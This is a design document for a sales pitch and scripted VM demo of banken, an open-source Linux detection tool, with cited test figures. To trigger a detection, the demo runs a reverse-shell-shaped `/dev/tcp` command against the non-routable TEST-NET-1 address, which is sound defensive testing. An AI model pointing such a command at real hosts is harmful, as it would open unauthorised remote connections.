# Repo showcase: the 5-minute pitch

This is a design, not a build. The goal is to give a prospective sysadmin a crisp, honest,
reproducible way to pitch banken to management in about five minutes. It is grounded only in what
the repo proves today. Every number below is cited to its source in this repo. Nothing is invented.

Where the brief that seeded this doc carried a looser figure, the repo's measured figure wins. The
discrepancy is called out.

## 1. The 5-minute narrative

The person giving this pitch is a working sysadmin or security engineer. They already run a SIEM.
They are tired of either paying for a heavyweight commercial EDR or squinting at raw auditd. The
pitch has four beats.

### Beat 1 - the problem (about 45 seconds)

- Commercial host EDR is expensive and heavy. It is licensed per endpoint. The agent is
  multi-hundred-MB, with its own runtime and often a kernel driver that can take the host down with
  it. (The 2024 CrowdStrike channel-file outage is the cautionary tale: a bad content update to a
  kernel component blue-screened machines worldwide.)
- auditd on its own is the opposite failure. It is free and already on the box. But it is a
  firehose of multi-line records. It has no detections, no mapping to ATT&CK, and nothing a SIEM
  can read without glue.
- So the honest middle is unfilled for most shops. That middle is: catch the obvious attacks, map
  them to ATT&CK, hand my SIEM clean findings, and do not cost a fortune or risk the kernel.

banken's framing, from the README: "SentinelOne for the masses - install in one line, no
fiddling." (README.md, lines 10-16.)

### Beat 2 - the hook: install it, watch it catch a live reverse shell, see it in your SIEM (about 2 minutes)

This is the live demo (section 2). On screen, in order:

1. One line of config turns it on. On NixOS it is `services.banken.enable = true;`. That pulls in
   auditd with the rules banken reads, a hardened one-shot unit, and a timer, alerting to the
   journal. (README.md "Use (NixOS)", lines 364-382; docs/deployment.md lines 5-9.) On any other
   systemd Linux it is a four-stage path of three-to-five commands (docs/install-and-onboarding.md
   Part A).
2. A benign reverse-shell-shaped command runs as an ordinary unprivileged user. This is the repo's
   own `tests/emulations/revshell.sh` analogue: `bash -c 'exec 3<>/dev/tcp/192.0.2.1/PORT'`, where
   192.0.2.1 is TEST-NET-1 and routes nowhere. Nothing leaves the box. The command *shape* is what
   fires the rule. (tests/emulations/revshell.sh; tests/switch.nix lines 50-60.)
3. The alert appears, fast. It is already a standards finding, not a log line: an OCSF 1.3.0
   Detection Finding (class_uid 2004), analytic name `reverse_shell`, ATT&CK tactic/technique
   attached. (tests/switch.nix lines 74-81.) Point at the exec-to-alert latency the demo prints.

### Beat 3 - the proof points (about 1.5 minutes)

Show the one-page scorecard (section 2d). Each claim with its source:

- **Fast.** banken's eBPF sensor mimi runs as a live push stream. In that mode the end-to-end
  switch test measures exec-to-alert latency and prints it on each run. Measured figures, all
  sub-second:
  - 267 ms in the VM switch proof of the 2026-11-02 full test battery
  - 83 ms on the deployed hokkaido host after re-arming the follow
  - 28-33 ms on the first live hardware load

  (tests/switch.nix lines 71, 83-84; ~/notes/hokkaido-log.md entries 2026-11-01 "DEPLOYED
  ONE-SWITCH PROOF" and 2026-11-02 "testing swarm lane".) On the auditd floor without mimi, the
  *match itself* is about 10 us per threat event (README Performance, `BenchmarkDetectionLatency`,
  line 307-311). End-to-end there is that compute plus at most one timer interval (default two
  minutes, tunable, or `--watch` for a push stream), so the interval is the latency knob, not the
  matching. Be precise about which path is being shown. The sub-second number is the mimi stream
  path.
- **Drops into your SIEM with no glue.** Alerts emit as OCSF 1.3.0 Detection Findings, validated
  in CI by the OCSF project's own validator (ocsf-toolkit) against the compiled 1.3.0 schema. They
  also emit as ECS 8.11.0 and OTLP/HTTP log records. (README Standards, lines 156-166;
  docs/design/ocsf-output.md.) So Security Lake, Splunk, Datadog, Elastic or any OCSF/ECS/OTLP
  backend ingests findings with no per-product mapping. OCSF is the schema, OTLP is the pipe.
- **Proven on real distros, on their own kernels.** The live distro matrix boots each vendor's own
  cloud image under KVM. It installs banken exactly as the docs say, runs benign malware
  look-alikes against that distro's own kernel and auditd, and scores objectives. Green on 8
  distros plus NixOS as of 2026-10-31/11-01: Rocky 9, AlmaLinux 10, Fedora 44, Amazon Linux 2023,
  Debian 13, Ubuntu 24.04, openSUSE Leap 16, Arch. The matrix also loads mimi's eBPF probe via
  CO-RE on each distro's own kernel and detects a reverse shell off the mimi stream (M1-M5). The
  full run was 16/16. (README "Supported platforms", lines 123-144; tests/distros/README.md;
  ~/notes/hokkaido-log.md 2026-11-01 "per-distro matrix" = 16/16.)
- **ATT&CK coverage is measured, not self-reported.** A live Atomic Red Team range runs every
  Linux atomic of a pinned ART commit in a throwaway VM and scores detection per technique.
  Measured 2026-11-01 (ART e8cfc41): **24 of 115 techniques detected on merit** (a rule about the
  technique fired), 71 of 409 atomics. The count is 40 of 115 if sudo-only incidental hits are
  counted, which the scorecard deliberately discounts. (README Standards line 163;
  attackrange/README.md lines 42-47.) NOTE: this corrects the seeding brief's "41/115 on merit".
  The honest on-merit figure is 24/115; 40/115 is the looser sudo-inclusive count. Frame it as
  "measured and improving, with a published rule roadmap for the misses", not as a finished number.
- **Open and auditable, and it cannot take your kernel down.** banken is one static
  `CGO_ENABLED=0` Go binary. There is no runtime, no Python, no kernel module, no driver. So,
  unlike the agents it takes after, a banken bug is a missed or wrong detection in userspace, never
  a kernel panic or a blue screen. It is pure Go, with no cgo and no `unsafe`, so whole EDR bug
  classes are structurally impossible: buffer overflow, use-after-free, and OOB read of untrusted
  bytes. Rules and logs are inert data with no eval path (the log4j lesson). (README "Security
  model", lines 314-362; docs/install-and-onboarding.md lines 22-38.) The hardened systemd unit
  scores exposure 2.1 "OK" under `systemd-analyze security` on every distro in the matrix. (README
  Standards line 165; tests/distros objective D1.) It is MIT licensed, and the rules are plain
  Sigma you can read and lift out. (README Licence.)

Keep this honesty note in the pitch. banken is early. There is no prebuilt binary or native
package yet, so non-NixOS users build the one static binary themselves. A per-host memory/CPU
footprint budget is specified but not yet measured (matrix objective D4 "to build"). Sysmon
end-to-end and the journald/syslog parsers are in progress or stubbed. The pitch should not claim a
footprint in MB. The repo does not measure one yet, so no number is given.

### Beat 4 - the close: what to ask management for (about 30 seconds)

- The ask: "Let me run banken on one representative fleet segment for two weeks, in observe mode,
  feeding our existing SIEM as OCSF. Zero licence cost, no kernel driver, one static binary under a
  hardened systemd sandbox. I will bring back the false-positive rate on our real traffic and the
  ATT&CK techniques it caught."
- The ask is small because the risk is small. There is no per-endpoint licence to negotiate,
  nothing that can blue-screen a host, and it rides the SIEM already in place. Management is being
  asked for a two-week pilot, not a procurement.

## 2. Format options and recommendation

Four candidate formats, scored on the three axes that matter:

- how **compelling** it is in the room
- how **honest** it is (hard to fake, grounded in the repo)
- how **reproducible** it is from this repo by the sysadmin themselves

| Option | Compelling | Honest | Reproducible | Notes |
| --- | --- | --- | --- | --- |
| (a) Scripted live demo (`nix run`/`just demo`, boots a throwaway VM, runs the benign revshell, shows the OCSF alert + latency live) | High | Highest (runs the real binary + real auditd/mimi, re-runnable by the viewer) | High (built from existing switch.nix / vm.nix harness) | Needs KVM. mimi flavour also needs private mimi access. |
| (b) asciinema / GIF embedded in README | Medium-high | Medium (a recording can be doubted; honest only if it is of (a) and (a) is runnable) | N/A for the viewer (they watch, do not run) | Zero setup to view; the pitch works with no KVM. |
| (c) One-page "why banken" with the numbers | Medium | High if every number is cited (as section 1 is) | High (it is just a doc) | The management leave-behind; weak as the *hook*. |
| (d) Self-contained artifact: prebuilt VM image, or a `nix run` one-liner | High | Mixed: a prebuilt image is heavy and not reproducible-from-repo; a `nix run` one-liner IS (a) | VM image: low; `nix run`: high | No release artifacts exist yet (onboarding Part C), so a prebuilt image is not available today anyway. |

### Recommendation: a hybrid, (a) as the spine, with (b) and (c) as the fallbacks

Build **(a) a reproducible scripted VM demo** as the primary artifact. Derive the other two from
the same source: **(b) a checked-in asciinema recording of it** and **(c) a one-page cited
scorecard**. This is the most compelling, the most honest, and the most reproducible combination,
because:

- It is the only option where the sysadmin's boss (or their own skeptical security lead) can
  **re-run the exact thing they just watched** - `nix run github:conor-sometimes/banken#demo` - and
  get the same result on their own hardware. That reproducibility is the honesty win a bare GIF can
  never have. It matches banken's whole "measured, not self-reported" ethos.
- It reuses infrastructure that already exists and is already green, so it invents almost no new
  code and cannot drift from the truth. Those pieces are `tests/switch.nix` (the one-switch
  end-to-end proof that already runs the benign revshell and asserts the OCSF `reverse_shell`
  finding, printing the measured exec-to-alert latency) and `tests/vm.nix` (the module's
  auditd-floor end-to-end test).
- `nix run` IS option (d)'s self-contained artifact, without needing a release pipeline that does
  not exist yet.

Two tiers, mirroring the existing `distro-matrix` / `distro-matrix-mimi` split, so the demo is
runnable by everyone, not just those with mimi:

- **`nix run .#demo` (auditd floor, the universal tier).** It uses `services.banken.enable = true;`
  only, no mimi, no private access. It boots a NixOS VM, runs the benign revshell as an
  unprivileged user, and shows the OCSF `reverse_shell` finding land in the journal and the jsonl
  sink within a short (demo-set) interval. Reproducible by anyone with KVM. This is the floor
  everybody can re-run.
- **`nix run .#demo-mimi` (the eBPF switch, the "wow" tier).** It is the exact `tests/switch.nix`
  setup: `services.banken.mimi.enable = true;`, audit off so mimi is the only source, so the alert
  proves the full eBPF path. The printed exec-to-alert latency is the sub-second number. It needs
  KVM and mimi access. This is the one that gets recorded as the asciinema cast in the README (so
  the sub-second catch is visible to the 90% who will not boot a VM), with a caption pointing at
  the universally runnable `nix run .#demo`.

The one-page scorecard (c) is checked in as `demo/pitch.md`, with every figure cited exactly as
section 1 does. It is the artifact the sysadmin prints and hands to management.

### What the demo shows on screen, second by second

The `demo-mimi` run (the recorded one), narrated transcript:

1. `0:00` Title line: "banken - one switch, a live reverse shell, an OCSF finding in your SIEM."
2. `0:02` Show the whole config: a four-line NixOS snippet with `services.banken.enable = true;`
   and `services.banken.mimi.enable = true;`. Caption: "This is the entire setup."
3. `0:05` VM boots; `systemctl --quiet is-active mimi.service banken.service` goes green. Caption:
   "mimi (the eBPF sensor) and banken are up. Audit is OFF - mimi is the only source, so any
   alert proves the eBPF path end to end."
4. `0:10` Show `systemctl show -p ExecStart banken.service | grep -- --watch` - banken is the
   continuous watcher, not the timer. (tests/switch.nix line 43.)
5. `0:12` As unprivileged user `alice`, run the benign reverse shell:
   `runuser -u alice -- timeout 3 bash -c 'exec 3<>/dev/tcp/192.0.2.1/47123'`. Caption:
   "192.0.2.1 is TEST-NET-1; it routes nowhere. Nothing leaves the box - the command shape is
   what fires the rule." Start the stopwatch.
6. `0:12.3` The alert lands. Pretty-print the OCSF finding: `class_uid: 2004`,
   `metadata.version: "1.3.0"`, `finding_info.analytic.name: "reverse_shell"`,
   `data_sources: ["mimi"]`, the ATT&CK tactic/technique. Big caption: "exec -> alert: 267 ms"
   (the number the script actually measured this run). (tests/switch.nix lines 71-81.)
7. `0:16` Show the same event in mimi's raw stream (`grep PORT /var/log/mimi/events.jsonl`) -
   the provenance of the alert. (tests/switch.nix line 81.)
8. `0:18` Show the finding arriving at a mock SIEM endpoint via the webhook/OTLP sink (OCSF on
   the wire), to make "lands in your SIEM" literal rather than asserted.
9. `0:22` `systemd-analyze security banken.service` -> exposure 2.1 "OK"; `file $(which banken)`
   -> a static, stripped ELF, no interpreter. Caption: "One static binary. No kernel module.
   Cannot blue-screen your host."
10. `0:28` Freeze on the scorecard card: 8 distros green, OCSF validated in CI, ATT&CK 24/115
    measured and rising, sub-second off the eBPF stream. Each with its source. End.

The `demo` (auditd-floor) run is the same storyboard minus mimi. Step 2 shows only
`services.banken.enable = true;`. Step 3 notes "auditd floor, no eBPF". Step 6's latency is "within
the scan interval" with the demo interval set short (e.g. `interval = "5s"`) so the wait is a few
seconds on camera, and `data_sources` is the auditd source. It asserts the same OCSF `reverse_shell`
finding.

## 3. What to build (concrete spec)

Reuse the existing harness. Add a thin, honest narration layer. New/changed files:

```
demo/
  demo.nix        # the VM demo derivation(s); takes a flavour arg {auditd|mimi}
  pitch.md        # the one-page cited scorecard (section 1's numbers), the management leave-behind
  banken-demo.cast  # asciinema recording of the demo-mimi run (committed)
  banken-demo.gif   # a GIF of the same, for README embedding (committed, small)
flake.nix         # add apps.demo and apps.demo-mimi (mirror apps.distro-matrix / distro-matrix-mimi)
justfile          # add a `demo` recipe -> `nix run .#demo`
README.md         # embed banken-demo.gif near the top, link `nix run .#demo`, link demo/pitch.md
```

### `demo/demo.nix`

- Build on `pkgs.testers.runNixOSTest`, imported from and modelled on `tests/switch.nix` (mimi
  flavour) and `tests/vm.nix` (auditd flavour). Do **not** fork the assertion logic. Import or
  factor out the shared testScript steps so the demo can never assert something the real test does
  not.
- Parameterise by flavour:
  - `auditd`: `imports = [ ../module.nix ]`; `services.banken = { enable = true; interval = "5s";
    alerts.jsonl = { enable = true; format = "ocsf"; }; }`. No mimi, no KVM-beyond-nixos-test needs.
  - `mimi`: exactly `tests/switch.nix`'s node (`imports = [ ../module.nix mimiModule ]`,
    `services.banken.mimi.enable = true; audit.enable = false;`), driven by the same small flake
    that supplies `banken` and `mimiModule`.
- The testScript runs `tests/emulations/revshell.sh`'s benign one-liner as unprivileged `alice`
  (reuse the existing emulation, do not write a new attack), waits for the OCSF finding, and
  prints a **narrated, timestamped transcript** to stdout (the storyboard above) rather than only
  the terse `SWITCH PROOF PASS` line. Keep every existing assertion from switch.nix: `class_uid
  == 2004`, `metadata.version == "1.3.0"`, `analytic.name == "reverse_shell"`, the port present in
  `/var/log/mimi/events.jsonl` (mimi flavour), and the printed `exec->alert {latency} ms`.
- Add two cheap "show, not assert" steps that are honest and land in the pitch: print
  `systemd-analyze security banken.service` (expect the 2.1/"OK" the matrix already gets - D1) and
  `file` on the banken binary to show it is a static ELF. These are display, not new guarantees.
- Add a mock SIEM receiver step: a tiny local HTTP listener in the VM, with
  `alerts.webhook = { enable = true; url = "http://127.0.0.1:PORT"; style = "ocsf"; }` (inline
  non-secret URL is allowed per docs/deployment.md), and show the POSTed OCSF body. This makes
  "lands in your SIEM" literal. (Alternatively the OTLP sink to a mock collector.)

### `flake.nix`

- Add `apps.x86_64-linux.demo` (auditd flavour, self-contained: only needs this repo + nixpkgs +
  KVM) and `apps.x86_64-linux.demo-mimi` (mimi flavour, needs the mimi input), mirroring the
  existing `apps.distro-matrix` / `apps.distro-matrix-mimi` pattern (flake.nix lines 49-55). Keep
  banken's flake decoupled from mimi: `demo` must build and run with no mimi access; only
  `demo-mimi` pulls the mimi input, exactly as `distro-matrix` vs `distro-matrix-mimi` do today.

### `demo/pitch.md`

- The one-page leave-behind. Section 1 Beat 3's bullet list, each number with its in-repo source,
  plus the one-line install and the two-week-pilot ask. Keep it to one printed page. It is the
  only artifact that leaves the room, so it must be the most conservative: on-merit ATT&CK 24/115
  (not 40), no footprint-in-MB claim, "early but past the floor" stated plainly.

### Recording (`banken-demo.cast` / `.gif`)

- Record the `demo-mimi` run with asciinema (`asciinema rec`), committed as `demo/banken-demo.cast`;
  render a small GIF (`agg` or `asciinema-agg`) as `demo/banken-demo.gif` for README embedding.
  Because the cast is a recording of a `nix run` anyone can reproduce, it is honest: the README
  caption links the runnable command next to the GIF. Keep the GIF small (a few hundred KB); the
  cast is the source of truth.

### What it asserts vs merely shows (keep the line clear)

- **Asserts** (inherited from switch.nix/vm.nix, so a regression fails the demo build): the OCSF
  2004 / 1.3.0 / `reverse_shell` finding fires off the correct source within the window, and (mimi)
  the exec is in mimi's stream.
- **Shows** (display only, not a pass/fail gate): the latency number, the exposure score, the
  static-binary `file` output, the SIEM receiver body. These illustrate; they do not newly prove.

### Explicitly out of scope / do-not

- Do not invent a new attack or a new VM harness - reuse `tests/emulations/revshell.sh`,
  `tests/switch.nix`, `tests/vm.nix`.
- Do not claim a memory/CPU footprint number until matrix objective D4 lands (tests/distros/README
  "to build").
- Do not state ATT&CK coverage as 40+/115 "on merit" - the on-merit figure is 24/115 (attackrange/README).
- The `demo` (auditd) flavour must not depend on mimi, so the universal tier stays universal.

## Appendix: source index for every claim

| Claim | Source in repo |
| --- | --- |
| One-line NixOS install (`services.banken.enable = true;`) | README.md 364-382; docs/deployment.md 5-9; docs/install-and-onboarding.md 52-69 |
| Generic systemd install path | docs/deployment.md 24-52; docs/install-and-onboarding.md Part A |
| mimi switch exec-to-alert latency (267 ms VM / 83 ms deployed / 28-33 ms live) | tests/switch.nix 71,83-84; ~/notes/hokkaido-log.md 2026-11-01, 2026-11-02 |
| auditd floor: ~10 us match compute, end-to-end = compute + <= one interval | README.md 307-311; docs/deployment.md 49-52 |
| OCSF 1.3.0 validated in CI by ocsf-toolkit; ECS 8.11.0; OTLP | README.md 156-166, 264-271; docs/design/ocsf-output.md; justfile `ocsf-validate` |
| pySigma 182/182; loads 210/210 SigmaHQ Linux r2026-07-01 | README.md 158, 241-245; conformance/ |
| 8 distros + NixOS green on own kernels (2026-10-31/11-01); mimi M1-M5; 16/16 | README.md 123-144; tests/distros/README.md; ~/notes/hokkaido-log.md 2026-11-01 |
| ATT&CK: 24/115 on merit, 40/115 sudo-inclusive, ART e8cfc41, 2026-11-01 | README.md 163; attackrange/README.md 42-47 |
| Single static CGO-free Go binary, no kernel module, no cgo/unsafe | README.md 314-362; docs/install-and-onboarding.md 22-38 |
| Hardened unit, exposure 2.1 "OK" on every matrix distro | README.md 165; tests/distros/README.md objective D1 |
| MIT licence, rules are plain Sigma | README.md 473-476 |
| No prebuilt binary / native packages yet; footprint not yet measured | docs/install-and-onboarding.md Part C; tests/distros/README.md objective D4 |
